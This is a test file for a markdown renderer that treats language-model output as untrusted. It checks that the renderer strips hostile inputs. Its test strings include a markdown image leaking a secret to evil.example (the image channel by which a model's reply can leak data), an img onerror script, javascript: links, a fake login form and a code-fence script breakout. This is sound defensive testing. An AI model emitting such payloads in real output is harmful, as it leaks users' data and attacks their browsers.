import { describe, expect, it } from "vitest";
import { renderMarkdown, renderInlineMarkdown } from "./markdown";


describe("renderMarkdown (model output is untrusted)", () => {
  it("renders normal markdown", () => {
    const html = renderMarkdown("**bold** and a list\n\n- one\n- two");
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain("<li>one</li>");
  });

  it("drops images, which would be a zero-click exfiltration channel", () => {
    expect(renderMarkdown("![x](https://evil.example/leak?q=SECRET)")).not.toContain("<img");
    expect(renderMarkdown('<img src="https://evil.example/x" onerror="alert(1)">')).not.toMatch(/<img|onerror/);
  });

  it("removes scripts, inline handlers, javascript: URLs and style attributes", () => {
    const html = renderMarkdown(`<script>alert(1)</script><a href="javascript:alert(2)" onclick="x()">a</a><div style="position:fixed">o</div>`);
    expect(html).not.toMatch(/<script|javascript:|onclick|style=/);
  });

  it("removes form controls so an answer cannot draw a fake login form", () => {
    expect(renderMarkdown('<form action="https://evil.example"><input name="pw"><button>go</button></form>')).not.toMatch(/<form|<input|<button/);
  });

  it("forces links to open safely", () => {
    const html = renderMarkdown("[docs](https://example.com)");
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
  });

  it("wraps tables in a focusable scroll region and adds copy buttons to code blocks", () => {
    const table = renderMarkdown("| a | b |\n|---|---|\n| 1 | 2 |");
    expect(table).toContain('class="table-scroll"');
    expect(table).toContain('tabindex="0"');
    const code = renderMarkdown("```sql\nSELECT 1;\n```");
    expect(code).toContain('class="code-block"');
    expect(code).toContain('class="code-copy"');
    expect(code).toContain(">sql<");
  });

  it("does not let a code-fence language break out of the label", () => {
    const html = renderMarkdown('```"><script>x</script>\ncode\n```');
    expect(html).not.toContain("<script");
  });

  it("renderInlineMarkdown formats inline markdown without paragraphs or raw asterisks", () => {
    const formatted = renderInlineMarkdown("Draft / review the **Vendor Contract** (see `contract.csv`)");
    expect(formatted).toContain("<strong>Vendor Contract</strong>");
    expect(formatted).toContain("<code>contract.csv</code>");
    expect(formatted).not.toContain("**");
    expect(formatted).not.toContain("<p>");
  });
});


